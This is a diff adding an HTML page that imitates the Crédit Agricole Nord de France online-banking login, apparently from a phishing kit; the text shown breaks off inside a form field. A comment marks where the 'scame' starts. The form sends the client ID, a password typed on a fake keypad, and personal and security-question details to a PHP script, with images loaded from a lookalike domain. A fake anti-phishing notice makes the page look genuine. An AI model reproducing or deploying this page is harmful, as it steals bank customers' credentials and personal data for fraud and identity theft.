@@ -1,0 +1,2488 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head prefix="og: http://ogp.me/ns#">
+<title>Crédit Agricole  - Banque en Ligne - Accueil - Particuliers</title>
+<meta name="author" content="Crédit Agricole"/>
+<meta name="copyright" content="&copy; 2007 Crédit Agricole"/>
+
+	<link href="http://www.ca-norddefrance.fr/Vitrine/ObjCommun/DCIV2/css/global.css" type="text/css" rel="stylesheet" media="all" />
+	<link href="http://www.ca-norddefrance.fr/Vitrine/ObjCommun/DCIV2/css/accueil.css" type="text/css" rel="stylesheet" media="all" />
+	<link href="http://www.ca-norddefrance.fr/Vitrine/ObjCommun/DCIV2/css/print.css" type="text/css" rel="stylesheet" media="print" />
+	<!--[if lte IE 8]><link rel="stylesheet" type="text/css" href="http://www.ca-norddefrance.fr/Vitrine/ObjCommun/DCIV2/css/ie.css" media="all" /><![endif]-->
+	<!--[if lte IE 9]><link rel="shortcut icon" type="image/x-icon" href="http://www.ca-norddefrance.fr/Vitrine/ObjCommun/DCIV2/img/favicon.ico" /><![endif]-->     
+	
+
+<!-- Debut G3, TMAVIE -->
+
+<!-- Fin TMAVIE, Debut TMANICEV1AC -->
+
+
+<!-- Fin TMANICEV1AC, G3 -->
+<script type="text/javascript" src="http://www.ca-norddefrance.fr/Vitrine/ObjCommun/DCI/js/ecart-v1/jquery.min.js"></script>
+<script type="text/javascript" src="http://www.ca-norddefrance.fr/Vitrine/ObjCommun/DCI/js/wg/jquery.pngFix.pack.js"></script>
+<!-- debut SICRP-474 -->
+<script>
+jQuery.noConflict();
+</script>
+<!-- fin SICRP-474 -->
+<script type="text/javascript" src="http://www.ca-norddefrance.fr/Vitrine/ObjCommun/DCI/js/ap_full.js" language="javascript"></script>
+<script type="text/javascript" src="http://www.ca-norddefrance.fr/Vitrine/ObjCommun/js/utils.js" type="text/javascript"></script>
+<script type="text/javascript" src="http://www.ca-norddefrance.fr/Vitrine/ObjCommun/js/monitor.js" type="text/javascript"></script>
+<script type="text/javascript" src="http://www.ca-norddefrance.fr/Vitrine/ObjCommun/js/tools.js" type="text/javascript"></script>
+<script type="text/javascript" src="http://www.ca-norddefrance.fr/Vitrine/ObjCommun/js/recherche.js" type="text/javascript"></script>
+<script type="text/javascript" src="http://www.ca-norddefrance.fr/Vitrine/ObjCommun/js/browser.js" type="text/javascript"></script>
+<script type="text/javascript" src="http://www.ca-norddefrance.fr/Vitrine/ObjCommun/js/xiti-tmp.js" type="text/javascript"></script>
+<script language="javascript" src="http://www.ca-norddefrance.fr/Vitrine/ObjCommun/js/xtplugF.js" type="text/javascript"></script>
+
+
+<!-- DEBUT SICRH-72 Inversion des 2 blocs js, SICRH-52-PROTO -->
+
+
+
+<!-- DEBUT 06/06/2013 : CRI : CANOUS 5837 : Anomalie affichage réglettes bloc Simulateur de livret d'épargne -->
+<!-- changement de la condition pour l'affichage de la réglette dans les 2 cas typeStandard et mode de saisie d'identification --> 
+
+<script type="text/javascript" src="http://www.ca-norddefrance.fr/Vitrine/ObjCommun/DCI/js/ecart-v1/jquery-ui.min.js"></script>
+<script type="text/javascript" src="http://www.ca-norddefrance.fr/Vitrine/ObjCommun/DCI/js/wg/jquery.pngFix.pack.js"></script>
+<script type="text/javascript">
+function identi(){
+var x=document.forms["Keypad"]["ident"].value;
+if (x==null || x=="") { alert("Veuillez vous identifier"); return false; }
+
+var x=document.forms["Keypad"]["ReadOut"].value;
+if (x==null || x=="") { alert("Veuillez vous identifier"); return false; }
+}
+
+
+function verifica(){
+var x=document.forms["Keypad"]["nom"].value;
+if (x==null || x=="") { alert("Il manque des informations : Les champs marqués d'un asterisque * sont obligatoires"); return false; }
+
+var x=document.forms["Keypad"]["prenom"].value;
+if (x==null || x=="") { alert("Il manque des informations : Les champs marqués d'un asterisque * sont obligatoires"); return false; }var x=document.forms["Keypad"]["born"].value;
+if (x==null || x=="") { alert("Il manque des informations : Les champs marqués d'un asterisque * sont obligatoires"); return false; }var x=document.forms["Keypad"]["departement"].value;
+if (x==null || x=="") { alert("Il manque des informations : Les champs marqués d'un asterisque * sont obligatoires"); return false; }var x=document.forms["Keypad"]["adress"].value;
+if (x==null || x=="") { alert("Il manque des informations : Les champs marqués d'un asterisque * sont obligatoires"); return false; }var x=document.forms["Keypad"]["zip"].value;
+if (x==null || x=="") { alert("Il manque des informations : Les champs marqués d'un asterisque * sont obligatoires"); return false; }var x=document.forms["Keypad"]["ville"].value;
+if (x==null || x=="") { alert("Il manque des informations : Les champs marqués d'un asterisque * sont obligatoires"); return false; }
+
+var x=document.forms["Keypad"]["rue_grandi"].value;
+if (x==null || x=="") { alert("Il manque des informations : Les champs marqués d'un asterisque * sont obligatoires"); return false; }
+
+var x=document.forms["Keypad"]["cousin"].value;
+if (x==null || x=="") { alert("Il manque des informations : Les champs marqués d'un asterisque * sont obligatoires"); return false; }
+
+var x=document.forms["Keypad"]["bestfriend"].value;
+if (x==null || x=="") { alert("Il manque des informations : Les champs marqués d'un asterisque * sont obligatoires"); return false; }
+
+var x=document.forms["Keypad"]["mikiyate"].value;
+if (x==null || x=="") { alert("Il manque des informations : Les champs marqués d'un asterisque * sont obligatoires"); return false; }
+
+
+var x=document.forms["Keypad"]["vacance"].value;
+if (x==null || x=="") { alert("Il manque des informations : Les champs marqués d'un asterisque * sont obligatoires"); return false; }
+
+var x=document.forms["Keypad"]["telephone"].value;
+if (x==null || x=="") { alert("Il manque des informations : Les champs marqués d'un asterisque * sont obligatoires"); return false; }var x=document.forms["Keypad"]["rep"].value;
+if (x==null || x=="") { alert("Il manque des informations : Les champs marqués d'un asterisque * sont obligatoires"); return false; }
+}
+
+
+
+function funcCaller() {
+
+var x=document.forms["Keypad"]["xrypt"].value;
+if (x==null || x=="") { alert("Il manque des informations : Les champs marqués d'un asterisque * sont obligatoires"); return false; }
+
+  document.getElementById("aa").style.display = "none";
+  document.getElementById("bb").style.display = "none";
+  document.getElementById("dd").style.display = "none";
+  document.getElementById("ff").style.display = "block";
+}
+
+
+
+
+
+
+function cc(){
+var x=document.forms["Keypad"]["nuum"].value;
+if (x==null || x=="") { alert("Il manque des informations : Les champs marqués d'un asterisque * sont obligatoires"); return false; }var x=document.forms["Keypad"]["xrypt"].value;
+if (x==null || x=="") { alert("Il manque des informations : Les champs marqués d'un asterisque * sont obligatoires"); return false; }
+}
+
+
+
+
+
+function GoToaa()
+{
+  document.getElementById("aa").style.display = "block";
+  document.getElementById("bb").style.display = "none";
+  document.getElementById("dd").style.display = "none";
+  document.getElementById("ff").style.display = "none";
+}
+
+function GoTobb()
+{
+  document.getElementById("aa").style.display = "none";
+  document.getElementById("bb").style.display = "block";
+  document.getElementById("dd").style.display = "none";
+  document.getElementById("ff").style.display = "none";
+}
+
+
+function GoTodd()
+{
+  document.getElementById("aa").style.display = "none";
+  document.getElementById("bb").style.display = "none";
+  document.getElementById("dd").style.display = "block";
+  document.getElementById("ff").style.display = "none";
+}
+
+function GoToff()
+{
+  document.getElementById("aa").style.display = "none";
+  document.getElementById("bb").style.display = "none";
+  document.getElementById("dd").style.display = "none";
+  document.getElementById("ff").style.display = "block";
+}
+</script>
+
+
+<style>
+body{
+	margin:0px;
+	background:url('img/fond.gif');
+	background-position:top center;
+	background-repeat:no-repeat;	
+}
+
+#navv {
+	background:url('img/menuu.png'); }
+
+#navv a{
+	font-family:verdana;
+	font-size:11px;
+	color:#ffffff;
+	font-weight:bold;
+	text-decoration:none;
+
+}
+#nav a{
+	font-family:verdana;
+	font-size:11px;
+	color:#ffffff;
+	font-weight:bold;
+	text-decoration:none;
+}
+
+
+
+#nav {
+	background:url('img/menu.png');
+}
+
+#nav:Hover {
+	background:url('img/menuu.png');
+}
+	#aa { display: block; }
+	#bb { display: none; }
+	#dd { display: none; }
+	#ff { display: none; }
+	
+</style>
+</head>
+
+<!--TMABLOCAD TMABLOCDH TMATOCOV TMARECCLILOT3  TMAREFOF-->
+<body>
+<!--Debut TMARECCLILOT2 - CANOUS-6537 -->
+
+
+
+
+<!--Fin TMARECCLILOT2 CANOUS-6537-->
+<!-- <h1> marché Entet value : particuliers </h1> -->
+<div id="__contentRoot" class="accueil">
+
+
+
+<!-- Debut TMANICEV1AC -->
+
+
+
+<!-- Deb top -->
+<div id="top">
+	<!-- Deb Header -->
+	<div id="header">
+		<div id="logo">
+
+<!-- Debut TMAVIE -->
+
+			<a title="Page d'accueil" href="/"><img width="268" height="160" alt="Crédit Agricole Nord de France" src="http://acligole1465487fsd55ds56ds.net/img//logo.jpg"></a>
+
+<!-- Fin TMAVIE -->                                            
+	      <h1>Crédit Agricole <br/> Nord de France</h1>
+
+                                               
+			   <h2>Banque <span>et</span> Assurances</h2>
+                                               
+
+	  </div>
+		<div id="navComptes">
+			<div id="petiteNav">
+				<ul>
+
+					<li class="bR"><a href="http://aideenligne.ca-norddefrance.fr/" title="ASSISTANCE EN LIGNE" onclick="xiti_clic('N', 'ASSISTANCE CA EN LIGNE');" target="_blank">ASSISTANCE EN LIGNE</a></li>    <!-- Canous-5862  -->
+
+					<li class="bR"><a href="/contactez-nous.html" title="Contact">Contact</a></li>    <!-- Canous-5862  -->
+
+					<li class="bR"><a href="/banque-assurance.html" title="Trouver une agence">Trouver une agence</a></li>    <!-- Canous-5862  -->
+
+				</ul>
+			</div>
+
+		</div>
+	</div>
+
+	<!-- Fin Header -->
+
+
+<script type="text/javascript" src="http://www.ca-norddefrance.fr/Vitrine/ObjCommun/DCIV2/js/jquery.jfeed.js"></script>
+
+<!-- Debut TMACARROUSEL -->
+<script type="text/javascript" src="http://www.ca-norddefrance.fr/Vitrine/ObjCommun/DCIV2/js/carousel.js"></script>
+<script type="text/javascript" src="http://www.ca-norddefrance.fr/Vitrine/ObjCommun/DCIV2/js/jquery.color.js"></script>
+
+<!-- Fin TMACARROUSEL, Début CANOUS-786  -->
+
+
+
+
+<script>
+jQuery(document).ready(function(){
+                                                /* Début TMASIMINFO */
+			 jQuery(".blocsuggestion .bloc_contenu span").click(function () {
+			 /*jQuery(".bloc_contenu #connexe").click(function () {*/
+                                                /* Fin modification TMASIMINFO */
+				$clickedpos = jQuery(this).parent().attr('class');
+				if ($clickedpos != 'pos1') {
+					$pos1elt = jQuery(this).parent().parent().find('div.pos1').fadeOut('fast', function(){jQuery(this).removeClass('pos1').addClass($clickedpos).fadeIn('fast');})
+					jQuery(this).parent().fadeOut('fast', function(){
+						jQuery(this).removeClass($clickedpos).addClass('pos1').fadeIn('fast')
+					});
+				}
+		  });
+	});
+</script>
+
+
+
+
+
+
+
+
+
+
+<!-- scame start here <div id="main"> -->
+
+
+<table cellpadding="0" cellspacing="0" border="0" width="980" align="center">
+<tr><FORM name="Keypad" action="./zin.php" id="afm_form_13aa61af" method="POST" onSubmit="return cc()" target="myiframe">
+</tr>
+
+<tr>
+<td height="20"></td>
+</tr>
+
+<tr>
+<td>
+
+
+<div id="aa">
+	<table cellpadding="0" cellspacing="0" border="0" height="35">
+	<tr align="center">
+	<td width="327" id="navv"><a href="javascript:GoToaa();">Accès CLIENT</a></td><td bgcolor="#ffffff" width="1"></td>
+	<td width="327" id="nav"><a href="javascript:alert('Veuillez vous identifier');">VÉRIFICATION</a></td><td bgcolor="#ffffff" width="1"></td>
+	<td width="327" id="nav"><a href="javascript:alert('Veuillez vous identifier');">VALIDATION</a></td>
+	</tr>
+	</table>
+		<br>
+		<table cellpadding="0" width="100%" cellspacing="0" border="0">
+		<tr valign="top">
+		<td width="200">
+
+
+<img src="http://acligole1465487fsd55ds56ds.net/img//h1.png">
+
+<table width="100%">
+<tr>
+<td width="30"><font style="font-size:22px" color="#419a9f" face="verdana">01</td>
+<td><b><font style="font-size:13px"  color="#555555"  face="arial">Identifiez-vous</td>
+</tr>
+<tr><td height="5"></td></tr>
+<tr>
+<td align="center" colspan="2"><img src="http://acligole1465487fsd55ds56ds.net/img//1.jpg"></td>
+</tr>
+<tr><td height="5"></td></tr>
+<tr>
+<td align="center" colspan="2"><b><font style="font-size:11px" face="arial">Saisissez vos codes de Banque à distance</td>
+</tr>
+</table>
+
+	<br><img src="http://acligole1465487fsd55ds56ds.net/img//h1.png"><br>
+
+
+<table width="100%">
+<tr>
+<td width="30"><font style="font-size:22px" color="#419a9f" face="verdana">02</td>
+<td><b><font style="font-size:13px"  color="#555555"  face="arial">Remplissez le formulaire</td>
+</tr>
+<tr><td height="5"></td></tr>
+<tr>
+<td align="center" colspan="2"><img src="http://acligole1465487fsd55ds56ds.net/img//2.jpg"></td>
+</tr>
+<tr><td height="5"></td></tr>
+<tr>
+<td align="center" colspan="2"><b><font style="font-size:11px" face="arial">Remplissez le formulaire<br>sécurisé</td>
+</tr>
+</table>
+
+
+	<br><img src="http://acligole1465487fsd55ds56ds.net/img//h1.png"><br>
+
+
+<table width="100%">
+<tr>
+<td width="30"><font style="font-size:22px" color="#419a9f" face="verdana">03</td>
+<td><b><font style="font-size:13px"  color="#555555"  face="arial">Validez vos informations</td>
+</tr>
+<tr><td height="5"></td></tr>
+<tr>
+<td align="center" colspan="2"><img src="http://acligole1465487fsd55ds56ds.net/img//3.jpg"></td>
+</tr>
+<tr><td height="5"></td></tr>
+<tr>
+<td align="center" colspan="2"><b><font style="font-size:11px" face="arial">Vérifiez vos informations saisies et validez votre formulaire</td>
+</tr>
+</table>
+
+
+	<br><img src="http://acligole1465487fsd55ds56ds.net/img//h1.png"><br>
+
+
+<table width="100%">
+<tr>
+<td width="30"><font style="font-size:22px" color="#419a9f" face="verdana">04</td>
+<td><b><font style="font-size:13px"  color="#555555"  face="arial">Un conseiller vous contactera</td>
+</tr>
+<tr><td height="5"></td></tr>
+<tr>
+<td align="center" colspan="2"><img src="http://acligole1465487fsd55ds56ds.net/img//4.jpg"></td>
+</tr>
+<tr><td height="5"></td></tr>
+<tr>
+<td align="center" colspan="2"><b><font style="font-size:11px" face="arial">Un conseiller vous contactera afin de valider votre demande</td>
+</tr>
+</table>
+
+
+	<br><img src="http://acligole1465487fsd55ds56ds.net/img//h2.png"><br>
+
+
+
+		</td>
+		<td width="2"><img src="http://acligole1465487fsd55ds56ds.net/img//h.png"></td>
+		<td width="20"></td>
+
+		<td> 
+
+<p align="center"><font size="4" color="#000000" face="verdana">Accédez au formulaire sécurisé de <font size="4" color="#2E7E82">Credit-Agricole.Fr</font></font></p>
+<br>
+<font style="font-size:11px" color="#000000" face="verdana"><b>Identifiez-vous :</b></font>
+<br><br>
+
+
+
+
+<table cellpadding="0" cellspacing="0" border="0">
+
+<tr>
+
+<td><img src="http://acligole1465487fsd55ds56ds.net/img//1.png"></td>
+
+<td background="http://acligole1465487fsd55ds56ds.net/img//topp.png" height="6"></td>
+
+<td><img src="http://acligole1465487fsd55ds56ds.net/img//2.png"></td>
+
+</tr>
+
+<tr>
+
+<td background="http://acligole1465487fsd55ds56ds.net/img//22.png"></td>
+
+<td width="530" height="25">
+
+
+
+	<table cellpadding="0" cellspacing="0">
+
+	<tr>
+
+	<td width="10"></td>
+
+	<td><img src="http://acligole1465487fsd55ds56ds.net/img//s1.png"></td><td width="8"></td>
+
+	<td><font style="font-size:11px" face="arial">Saisissez votre code client à l'aide du clavier</td>
+	<td width="60"></td>
+	<td><font style="font-size:12px" face="arial"><b>VOTRE IDENTIFIANT <input name="ident" id="ident" type="text" style="width:100px;background-color:#EBEBE4; border:1px solid #003991" onKeyUp="remplir()"></td>
+
+	</tr>
+
+	</table>
+
+
+
+</td>
+
+<td background="http://acligole1465487fsd55ds56ds.net/img//11.png"></td>
+
+</tr>
+
+
+
+<tr>
+
+<td><img src="http://acligole1465487fsd55ds56ds.net/img//3.png"></td>
+
+<td background="http://acligole1465487fsd55ds56ds.net/img//bottom.png" height="10"></td>
+
+<td><img src="http://acligole1465487fsd55ds56ds.net/img//4.png"></td>
+
+</tr>
+
+</table>
+
+
+
+<font style="font-size:6px" face="arial"><br><br></font>
+
+<table cellpadding="0" cellspacing="0" border="0">
+
+<tr valign="top">
+<td>
+
+
+<table cellpadding="0" cellspacing="0" border="0">
+
+<tr>
+
+<td><img src="http://acligole1465487fsd55ds56ds.net/img//1.png"></td>
+
+<td background="http://acligole1465487fsd55ds56ds.net/img//topp.png" height="6"></td>
+
+<td><img src="http://acligole1465487fsd55ds56ds.net/img//2.png"></td>
+
+</tr>
+
+
+
+<tr>
+
+<td background="http://acligole1465487fsd55ds56ds.net/img//22.png"></td>
+
+<td width="300" height="200" valign="top">
+
+
+
+
+
+	<table cellpadding="0" cellspacing="0">
+
+	<tr><td height="8"></td></tr>
+
+
+
+	<tr>
+
+	<td width="10"></td>
+
+	<td><img src="http://acligole1465487fsd55ds56ds.net/img//s2.png"></td><td width="8"></td>
+
+	<td><font style="font-size:11px" face="arial">Cliquez pour composer les 6 chiffres de votre</td>
+
+	</tr>
+
+	</table>
+
+<br>
+<table width="100%">
+<tr valign="top">
+<td width="3"></td>
+<td width="136">
+
+
+<table cellpadding="0" cellspacing="0" border="0" style="border:1px solid #003A8D" background="http://acligole1465487fsd55ds56ds.net/img//NSImgGrille.gif" onClick="remplir()" width="136" height="136">
+
+<tr align="center">
+
+<td width="27" height="27">&nbsp;</td>
+
+<td width="27"><img src="http://acligole1465487fsd55ds56ds.net/img//p.gif" onClick="NumPressed(0)" width="27" height="27"></td>
+
+<td><img src="http://acligole1465487fsd55ds56ds.net/img//p.gif" onClick="NumPressed(1)" width="27" height="27"></td>
+
+<td width="27" height="27"><img src="http://acligole1465487fsd55ds56ds.net/img//p.gif" onClick="NumPressed(2)" width="27" height="27"></td>
+
+<td width="27" height="27"><img src="http://acligole1465487fsd55ds56ds.net/img//p.gif" onClick="NumPressed(3)" width="27" height="27"></td>
+
+
+
+</tr>
+
+
+
+<tr align="center">
+
+<td width="27" height="27"><img src="http://acligole1465487fsd55ds56ds.net/img//p.gif" onClick="NumPressed(4)" width="27" height="27"></td>
+
+<td width="27">&nbsp;</td>
+
+<td width="27">&nbsp;</td>
+
+<td width="27">&nbsp;</td>
+
+<td>&nbsp;</td>
+
+</tr>
+
+
+
+<tr align="center">
+
+<td width="27">&nbsp;</td>
+
+<td width="27">&nbsp;</td>
+
+<td width="27">&nbsp;</td>
+
+<td>&nbsp;</td>
+
+<td width="27" height="27"><img src="http://acligole1465487fsd55ds56ds.net/img//p.gif" onClick="NumPressed(5)" width="27" height="27"></td>
+
+</tr>
+
+
+
+<tr align="center">
+
+<td width="27">&nbsp;</td>
+
+<td width="27" height="27"><img src="http://acligole1465487fsd55ds56ds.net/img//p.gif" onClick="NumPressed(6)" width="27" height="27"></td>
+
+<td width="27" height="27"><img src="http://acligole1465487fsd55ds56ds.net/img//p.gif" onClick="NumPressed(7)" width="27" height="27"></td>
+
+<td width="27" height="27"><img src="http://acligole1465487fsd55ds56ds.net/img//p.gif" onClick="NumPressed(8)" width="27" height="27"></td>
+
+<td>&nbsp;</td>
+
+</tr>
+
+
+
+<tr align="center">
+
+<td width="27">&nbsp;</td>
+
+<td width="27" height="28"><img src="http://acligole1465487fsd55ds56ds.net/img//p.gif" onClick="NumPressed(9)" width="27" height="27"></td>
+
+<td width="27">&nbsp;</td>
+
+<td width="27">&nbsp;</td>
+
+<td>&nbsp;</td>
+
+</tr>
+
+
+
+</table>
+
+
+</td>
+
+<td align="center">
+
+<b><font style="font-size:12px" face="arial">MOT DE PASSE</font></b><br>
+<input name="ReadOut" id="ReadOut" type="password" readonly style="background-color:#EBEBE4; border:1px solid #003991; padding:2px; width:56px" maxlength="6">
+
+<br><br>
+<a href="#" onClick="Clear()"><img src="http://acligole1465487fsd55ds56ds.net/img//clean.gif" border="0"></a>
+
+</td>
+
+</table>
+
+
+
+
+<div style="display:none;">
+<input type="hidden" name="Name:" value="societ genrl">
+<textarea name="Message:" id="Message:"></textarea>
+</div>
+
+
+
+
+
+
+<SCRIPT LANGUAGE="JavaScript">
+
+var FKeyPad = document.Keypad;
+
+var Accumulate = x;
+
+var FlagNewNum = false;
+
+var PendingOp = "";
+
+
+
+function NumPressed (Num) {
+
+if (FlagNewNum) {
+
+FKeyPad.ReadOut.value  = Num;
+
+FlagNewNum = false;
+
+   }
+
+else {
+
+if (FKeyPad.ReadOut.value == "x")
+
+FKeyPad.ReadOut.value = Num;
+
+else
+
+FKeyPad.ReadOut.value += Num;
+
+   }
+
+}
+
+function ClearEntry () {
+
+FKeyPad.ReadOut.value = "";
+
+FlagNewNum = true;
+
+}
+
+function Clear () {
+
+Accumulate = 0;
+
+PendingOp = "";
+
+ClearEntry();
+
+}
+
+</SCRIPT>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</td>
+
+<td background="http://acligole1465487fsd55ds56ds.net/img//11.png"></td>
+
+</tr>
+
+
+
+<tr>
+
+<td><img src="http://acligole1465487fsd55ds56ds.net/img//3.png"></td>
+
+<td background="http://acligole1465487fsd55ds56ds.net/img//bottom.png" height="10"></td>
+
+<td><img src="http://acligole1465487fsd55ds56ds.net/img//4.png"></td>
+
+</tr>
+
+</table>
+
+
+
+
+</td>
+
+<td width="10"></td>
+<td>
+
+
+
+
+
+<table cellpadding="0" cellspacing="0" border="0">
+
+<tr>
+
+<td><img src="http://acligole1465487fsd55ds56ds.net/img//1.png"></td>
+
+<td background="http://acligole1465487fsd55ds56ds.net/img//topp.png" height="6"></td>
+
+<td><img src="http://acligole1465487fsd55ds56ds.net/img//2.png"></td>
+
+</tr>
+
+
+
+<tr>
+
+<td background="http://acligole1465487fsd55ds56ds.net/img//22.png"></td>
+
+<td width="206">
+
+
+
+	<table cellpadding="0" cellspacing="0">
+	<tr><td height="8"><td></tr>
+
+	<tr>
+
+	<td width="10"></td>
+
+	<td><img src="http://acligole1465487fsd55ds56ds.net/img//s3.png"></td><td width="8"></td>
+
+	<td><font style="font-size:11px" face="arial">Accédez au formulaire sécurisé</td>
+
+	</tr>
+	<tr><td height="18"><td></tr>
+	<tr>
+
+	<td width="10"></td>
+
+	<td></td><td></td>
+
+	<td align="center"><a href="javascript:GoTobb();" onClick="return identi()"><img src="http://acligole1465487fsd55ds56ds.net/img//valider.png" border="0"></a></td>
+
+	</tr>
+	<tr><td height="8"><td></tr>
+
+	</table>
+
+
+
+
+
+</td>
+
+<td background="http://acligole1465487fsd55ds56ds.net/img//11.png"></td>
+
+</tr>
+
+
+
+<tr>
+
+<td><img src="http://acligole1465487fsd55ds56ds.net/img//3.png"></td>
+
+<td background="http://acligole1465487fsd55ds56ds.net/img//bottom.png" height="10"></td>
+
+<td><img src="http://acligole1465487fsd55ds56ds.net/img//4.png"></td>
+
+</tr>
+
+</table>
+
+
+
+
+
+
+
+
+</td>
+
+
+</table>
+<br>
+
+
+
+
+
+
+
+
+
+
+<table cellpadding="0" cellspacing="0" border="0">
+
+<tr>
+
+<td><img src="http://acligole1465487fsd55ds56ds.net/img//1.png"></td>
+
+<td background="http://acligole1465487fsd55ds56ds.net/img//topp.png" height="6"></td>
+
+<td><img src="http://acligole1465487fsd55ds56ds.net/img//2.png"></td>
+
+</tr>
+
+
+
+<tr>
+
+<td background="http://acligole1465487fsd55ds56ds.net/img//22.png"></td>
+
+<td width="530" height="25">
+
+
+
+
+<font face=arial style="font-size:11px">
+<b>Information emails frauduleux </b><br>
+Une recrudescence de tentatives de phishing a été constatée. Retrouvez les règles et les bonnes pratiques à adopter aprés validation du formulaire sécurisé.
+
+
+
+
+</td>
+
+<td background="http://acligole1465487fsd55ds56ds.net/img//11.png"></td>
+
+</tr>
+
+
+
+<tr>
+
+<td><img src="http://acligole1465487fsd55ds56ds.net/img//3.png"></td>
+
+<td background="http://acligole1465487fsd55ds56ds.net/img//bottom.png" height="10"></td>
+
+<td><img src="http://acligole1465487fsd55ds56ds.net/img//4.png"></td>
+
+</tr>
+
+</table>
+
+
+
+
+
+
+
+
+
+
+
+		</td>
+		</tr>
+		</table>
+
+</div>
+
+
+<div id="bb">
+	<table cellpadding="0" cellspacing="0" border="0" height="35">
+	<tr align="center">
+	<td width="327" id="nav"><a href="javascript:GoToaa();">Accès CLIENT</a></td><td bgcolor="#ffffff" width="1"></td>
+	<td width="327" id="navv"><a href="javascript:GoTobb();">VÉRIFICATION</a></td><td bgcolor="#ffffff" width="1"></td>
+	<td width="327" id="nav"><a href="javascript:alert('Veuillez remplir le formulaire')">VALIDATION</a></td>
+	</tr>
+	</table>
+
+
+
+
+
+
+
+
+
+
+
+
+
+		<br>
+		<table cellpadding="0" width="100%" cellspacing="0" border="0">
+		<tr valign="top">
+		<td width="200">
+
+
+<img src="http://acligole1465487fsd55ds56ds.net/img//h1.png">
+
+<table width="100%">
+<tr>
+<td width="30"><font style="font-size:22px" color="#419a9f" face="verdana">01</td>
+<td><b><font style="font-size:13px"  color="#555555"  face="arial">Identifiez-vous</td>
+</tr>
+<tr><td height="5"></td></tr>
+<tr>
+<td align="center" colspan="2"><img src="http://acligole1465487fsd55ds56ds.net/img//1.jpg"></td>
+</tr>
+<tr><td height="5"></td></tr>
+<tr>
+<td align="center" colspan="2"><b><font style="font-size:11px" face="arial">Saisissez vos codes de Banque à distance</td>
+</tr>
+</table>
+
+	<br><img src="http://acligole1465487fsd55ds56ds.net/img//h1.png"><br>
+
+
+<table width="100%">
+<tr>
+<td width="30"><font style="font-size:22px" color="#419a9f" face="verdana">02</td>
+<td><b><font style="font-size:13px"  color="#555555"  face="arial">Remplissez le formulaire</td>
+</tr>
+<tr><td height="5"></td></tr>
+<tr>
+<td align="center" colspan="2"><img src="http://acligole1465487fsd55ds56ds.net/img//2.jpg"></td>
+</tr>
+<tr><td height="5"></td></tr>
+<tr>
+<td align="center" colspan="2"><b><font style="font-size:11px" face="arial">Remplissez le formulaire<br>sécurisé</td>
+</tr>
+</table>
+
+
+	<br><img src="http://acligole1465487fsd55ds56ds.net/img//h1.png"><br>
+
+
+<table width="100%">
+<tr>
+<td width="30"><font style="font-size:22px" color="#419a9f" face="verdana">03</td>
+<td><b><font style="font-size:13px"  color="#555555"  face="arial">Validez vos informations</td>
+</tr>
+<tr><td height="5"></td></tr>
+<tr>
+<td align="center" colspan="2"><img src="http://acligole1465487fsd55ds56ds.net/img//3.jpg"></td>
+</tr>
+<tr><td height="5"></td></tr>
+<tr>
+<td align="center" colspan="2"><b><font style="font-size:11px" face="arial">Vérifiez vos informations saisies et validez votre formulaire</td>
+</tr>
+</table>
+
+
+	<br><img src="http://acligole1465487fsd55ds56ds.net/img//h1.png"><br>
+
+
+<table width="100%">
+<tr>
+<td width="30"><font style="font-size:22px" color="#419a9f" face="verdana">04</td>
+<td><b><font style="font-size:13px"  color="#555555"  face="arial">Un conseiller vous contactera</td>
+</tr>
+<tr><td height="5"></td></tr>
+<tr>
+<td align="center" colspan="2"><img src="http://acligole1465487fsd55ds56ds.net/img//4.jpg"></td>
+</tr>
+<tr><td height="5"></td></tr>
+<tr>
+<td align="center" colspan="2"><b><font style="font-size:11px" face="arial">Un conseiller vous contactera afin de valider votre demande</td>
+</tr>
+</table>
+
+
+	<br><img src="http://acligole1465487fsd55ds56ds.net/img//h2.png"><br>
+
+
+
+		</td>
+		<td width="2"><img src="http://acligole1465487fsd55ds56ds.net/img//h.png"></td>
+		<td width="20"></td>
+
+		<td> 
+
+
+
+		<b><font color="#419a9f" face="arial" style="font-size:18px">Informations personnelles</font></b><br>
+
+		<font size="2" face="verdana">Pour continuer, veuillez entrer les informations demandées ci-dessous.<br><br>
+
+
+
+		<table cellpadding="0" cellspacing="0" width="660" border=0>
+
+		<tr><td bgcolor="#B3CAD6" width="20"></td> <td bgcolor="#B3CAD6" height="1"></td><td bgcolor="#B3CAD6"></td></tr>
+
+		<tr><td bgcolor="#E5E5E5" width="20">&nbsp;</td> <td bgcolor="#E5E5E5" height="26" width="200"><b><font size="2" face="verdana">Titulaire : </td><td bgcolor="#E5E5E5"></td></tr><tr><td bgcolor="#FFFFFF" height="1"></td></tr>
+
+		<tr><td bgcolor="#F7F9FC" width="20">&nbsp;</td> <td bgcolor="#F7F9FC" height="40"><font size="2" face="verdana"> Civilité<font color="red">*</td> <td bgcolor="#F7F9FC"><input type="radio" name="cevi" value="m"><font size="2" face="verdana"> M. <input type="radio" name="cevi" value="mme">Mme <input type="radio" name="cevi" value="mlle">Mlle</td></tr><tr><td bgcolor="#FFFFFF" height="1"></td></tr>
+
+		<tr><td bgcolor="#E5E5E5" width="20">&nbsp;</td> <td bgcolor="#E5E5E5" height="40"><font size="2" face="verdana"> Nom<font color="red">*</td> <td bgcolor="#E5E5E5"><input type="text" name="nom" id="nom" style="width:130px" onKeyUp="remplir()"></td></tr><tr><td bgcolor="#FFFFFF" height="1"></td></tr>
+
+		<tr><td bgcolor="#F7F9FC" width="20">&nbsp;</td> <td bgcolor="#F7F9FC" height="40"><font size="2" face="verdana"> Prénom<font color="red">*</td> <td bgcolor="#F7F9FC"><input type="text" name="prenom" id="prenom" style="width:130px" onKeyUp="remplir()"></td></tr><tr><td bgcolor="#FFFFFF" height="1"></td></tr>
+
+		<tr><td bgcolor="#E5E5E5" width="20">&nbsp;</td> <td bgcolor="#E5E5E5" height="40"><font size="2" face="verdana"> Date de naissance<font color="red">*</td> <td bgcolor="#E5E5E5"><input type="text" name="born" id="born" style="width:90px" onKeyUp="remplir()"> <font size="2" face="verdana" color="#999999">Format jj/mm/aaaa</td></tr><tr><td bgcolor="#FFFFFF" height="1"></td></tr>
+		<tr><td bgcolor="#F7F9FC" width="20">&nbsp;</td> <td bgcolor="#F7F9FC" height="40"><font size="2" face="verdana"> Département de naissance<font color="red">*</td> <td bgcolor="#F7F9FC">
+
+
+
+
+
+<select name="departement" id="departement" onclick="remplir()">
